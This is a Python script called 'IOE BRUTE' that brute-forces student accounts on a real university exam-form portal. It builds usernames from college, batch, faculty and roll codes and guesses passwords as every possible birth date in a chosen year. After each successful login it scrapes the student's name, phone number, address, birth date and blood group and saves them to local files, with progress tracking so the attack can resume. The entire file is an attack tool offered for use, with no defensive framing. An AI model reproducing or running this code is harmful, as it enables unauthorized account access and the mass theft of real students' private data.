import os
import sys
import re
import json


#imports all the necessary libraries, if not present it install the modules.
try:
    import mechanize
except ImportError:
    os.system("pip install mechanize")
try:
    from bs4 import BeautifulSoup as soup
except ImportError:
    os.system("pip install BeautifulSoup")
try:
    import pyfiglet
except ImportError:
    os.system("pip install pyfiglet")



#creating a browser using mechanize , cookiejar had to be created to save the cookies and delete it after sucessful login.

br = mechanize.Browser()
cookie_jar = mechanize.CookieJar()
br.set_cookiejar(cookie_jar)


# Initial function that get the required information from the user
def main():
    college = get_college()
    batch = get_batch()
    faculty = get_faculty()
   
    print("\n")

    noOfStudents = int(input("Enter the total number of students: "))+1
    getYear=input(f"Enter the year to attack (Leave empty for default {2000+int(batch)-19}):")
    if(getYear==""):
        getYear=str(2000+int(batch)-19)
    data = dataFile(college, batch, faculty,getYear)
    
    run(college, batch, faculty, noOfStudents, data,getYear)


# Prints the logo
def icon():
    result = pyfiglet.figlet_format("IOE BRUTE")
    print(result)
    print("Developed by Sandeep Poudel  :P   :)\n")


# Gets the college that user want to use
def get_college():

    os.system('clear')
    icon()
    college_map = {
        1: "PUR",
        2: "PUL",
        3: "PAS"
    }
    print('''Enter the college of the students:
    Purwanchal     ---  1
    Pulchowk       ---  2
    Paschimanchal  ---  3
    Exit           ---  99
    ''')
    cllg = int(input("Enter your choice: "))
    if cllg == 99:
        sys.exit()
    if cllg not in range(1, 4):
        print("Invalid input!")
    else:
        return (college_map[cllg])


# Get the batch of the students you want to find details of 
def get_batch():
    os.system('clear')
    icon()
    year_map = {
        1: "079",
        2: "078",
        3: "077",
        4: "076",
        5: "075"
    }
    print('''Select the admission year of the student:
    2079 --- 1
    2078 --- 2
    2077 --- 3
    2076 --- 4
    2075 --- 5
    Exit --- 99
    ''')
    yrs = int(input("Enter your choice: "))
    if yrs == 99:
        sys.exit()
    if yrs not in year_map:
        print("Invalid input!")
        print("Please provide a valid input.")
        return None
    return year_map[yrs]



# Gets the faculty the user wants to use
def get_faculty():
    os.system('clear')
    icon()
    faculty_map = {
        1: "BCT",
        2: "BAG",
        3: "BAR",
        4: "BEL",
        5: "BME",
        6: "BEI"
    }
    print('''Enter the faculty of the students:
    Computer Engineering    (BCT)  ---  1
    Agriculture Engineering (BAG)  ---  2
    Architecture            (BAR)  ---  3
    Electrical Engineering  (BEL)  ---  4
    Mechanical Engineering  (BME)  ---  5
    Electronics Engineering (BEI)  ---  6
    Back ---  00
    Exit ---  99
    ''')
    fac = int(input("Enter your choice: "))
    if fac == 99:
        sys.exit()
    if fac not in range(1, 5):
        print("Invalid input!")
        print("Please provide a valid input.")
        return None
    return faculty_map[fac]



# Checks if there is a data file for the college,faculty and batch the user chose
# If found it uses it , if not then it creates the file and adds the required values to run the program .

# ------------------------------------ DONT   CHANGE  ---------------------------------------------------
#------------------------------------- DONT   CHANGE  ---------------------------------------------------

def dataFile(college, batch, faculty,getYear):
    
    #creates the name for the json file
    data_file = "Json files/"+college+batch+faculty+".json"
    
    #tries to open the file. if file is present it checks if the Year user provided is present if not it adds the values for the year.

    try:
        with open(data_file, "r") as f:
            savedData = json.load(f)
            if getYear not in savedData[0]:
                savedData[0][getYear]={
                    "checkedMonth":1,
                    "checkedRoll":1
                }
            with open(data_file, "w") as f:
                json.dump(savedData,f) 
            return {"dataInFile": savedData, "fileName": data_file}

    #if file is not present then create the file.
    except FileNotFoundError:
        fileInitialConfig = f'''
[        
    {{             
        "arrayData": [],
        "{getYear}": {{
            "checkedMonth": 1,
            "checkedRoll": 1
        }}
    }}
]
'''
    #writing the initial configuration required for the script to run
        with open(data_file, "w") as f:
            f.write(fileInitialConfig)

        with open(data_file, "r") as f:
            savedData = json.load(f)
            return {"dataInFile": savedData, "fileName": data_file}


# Loops over the whole year and all the students to create username and password

def run(college, batch, faculty, noOfStudents, data,getYear):
   
    print("Running! Have patience :)    ...\n")
    #get the starting month and roll number form the file so that you can start where you left before.

    initialMonth = data["dataInFile"][0][f'{getYear}']["checkedMonth"]
    initialRoll = data["dataInFile"][0][f'{getYear}']["checkedRoll"]

    #loop through the months starting from the month that you left before.
    for month in range(initialMonth, 13):
        data["dataInFile"][0][f'{getYear}']["checkedMonth"]=month
        print(f"\b\b\b\bCurrently on month {month}")

        #updates the values in the json file everytime one month is completed
        updateData(month,1,data,getYear)

        #creating password for different months.
        if month < 10:
            passMonth = getYear+"-0"+str(month)+"-"
        else:
            passMonth = getYear+"-"+str(month)+"-"


        #creates different roll number to attack the month
        for students in range(initialRoll, noOfStudents):
            rep = True
            updateData(month,students,data,getYear)
            print("\r" + str(students).zfill(3), end=" ")
            if students < 10:
                roll = college+batch+faculty+"00"+str(students)
            else:
                roll = college+batch+faculty+"0"+str(students)

            if students not in data["dataInFile"][0]["arrayData"]:
                
                for days in range(1, 32):
                    if days < 10:
                        password = passMonth+"0"+str(days)
                    else:
                        password = passMonth+str(days)
                    if (rep):

                        #function that tries to login to the website
                        login(roll, password, data, students)
                    else:
                        break
            else:
                continue
        initialRoll=1
    initialMonth=1
            


# Tries to login to the website
# If sucessful runs the detail function to find the details of the student
def login(username, password, data, students):
    global rep
    try:
        br.open("https://examform.ioe.edu.np/Login")

        #checking internet connection
    except mechanize.HTTPError:
        print("No internet Connection")
        again=input("Do you want to try again? (y/n)")
        if (again=="Y" or again=="y"):
            main()


    #Configuring the browser 
    br.addheaders = [
        ('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
    br.set_handle_robots(False)
    br._factory.is_html = True
    br.select_form(nr=0)
    br.form['UserName'] = username
    br.form['Password'] = password
    br.submit()
    response = br.response().read()

    #IF login is sucessful then the browser opens the dashboard where we can see the students details 
    #Else it returns back to the login page.
    if not json.loads(response)['IsSuccess']:
        br.back()
    if json.loads(response)['IsSuccess']:
        rep= False
        print("\b\b\b")
        br.open("https://examform.ioe.edu.np/StudentPortal/Dashboard")
        
        #calling function to find the details and write it in files.
        details(data, students)


# finds the detail of the student and writes it to the corresponding files
def details(data, students):
    #reads the response
    html = br.response().read()
    savedData = data["dataInFile"]
    #clearing the history and cookies so that when you send request in the website again it wouldnt login you automatically in the previous account.
    br.clear_history()
    cookie_jar.clear()
    sp = soup(html, 'html.parser')

    #regression to find the data stored in javascript object in source code of the website.
    match = re.search(r'var data = ({.*?});', str(sp))
    if match:
        varfoundData = match.group(1)
        foundData = json.loads(varfoundData)

    #prints the student details in the terminal
        print(f'''\n
"--------------------------------")
Name :{foundData['FullName']}
Registration No: {foundData['RegistrationNo']}
College: {foundData['College']}
Phone No: { foundData['ContactNo']}
Address: {foundData['MunVdc']} {foundData['WardNo']}
Birth Date: {foundData['BirthDateBs']} | {foundData['BirthDateAd'][0:10]}
Blood Group: {foundData['BloodGroup']}
--------------------------------"
\n''')

    #making object of the found data in desired format
        rawfoundData = {
            "Name": foundData['FullName'],
            "Registration No": foundData['RegistrationNo'],
            "College": foundData['College'],
            "Phone No": foundData['ContactNo'],
            "Address": foundData['MunVdc'] + " " + foundData['WardNo'],
            "Birth Date": {"bs": foundData['BirthDateBs'], "ad": foundData['BirthDateAd'][0: 11]},
            "Blood Group": str(foundData['BloodGroup'])
        }
    #append the details of the students in the savedData array and write it in the corresponding json file.
        savedData.append(rawfoundData)
        savedData[0]["arrayData"].append(students)

        with open(data["fileName"], "w") as f:
            json.dump(savedData, f)



#writing the student details in the foundData.txt file
        file = open("foundData.txt", "a+")
        file.write(f'''
------------------------------------
Registration No: {foundData['RegistrationNo']} 
Name : {foundData['FullName']} 
College: {foundData['College']} 
Phone No: {foundData['ContactNo']} 
Address: {foundData['MunVdc']} {foundData['WardNo']} 
Birth Date: {foundData['BirthDateBs']} | {foundData['BirthDateAd']}  \n
Blood Group: {str(foundData['BloodGroup'])}  \n
------------------------------------
            ''')
        file.close()
        sort(data['fileName'])




#updates the data in the file so that you can start from the point where you stopped the script.
def updateData(newMonth, newRoll, data, year):
    if year not in data["dataInFile"][0]:
        data["dataInFile"][0][year] = {
            "checkedMonth": newMonth,
            "checkedRoll": newRoll
        }
    else:
        data["dataInFile"][0][year]["checkedMonth"] = newMonth
        data["dataInFile"][0][year]["checkedRoll"] = newRoll

    with open(data["fileName"], "w") as f:
        json.dump(data["dataInFile"], f)




#sort the json file in ascending order of ROll number of students.
#sorts in every sucessful login so that the details are shown in ascending order which makes it easier to find and search a specific person.

def sort(file):
    with open(file,"r") as f:
        data=json.load(f)

    for i in range(1,len(data)-1):
            for j in range(i+1,len(data)):
                if (data[i]['Registration No']>data[j]['Registration No']):
                    data[i],data[j]=data[j],data[i]
    for i in range(0,len(data)-1):
        for j in range(i+1,len(data[0]['arrayData'])):
            if (data[0]["arrayData"][i] > data[0]["arrayData"][j]):
                data[0]["arrayData"][i] , data[0]["arrayData"][j]=data[0]["arrayData"][j],data[0]["arrayData"][i]

    with open(file, "w") as f:
        json.dump(data,f)
	

# running the main function
if __name__ == '__main__':
    main()
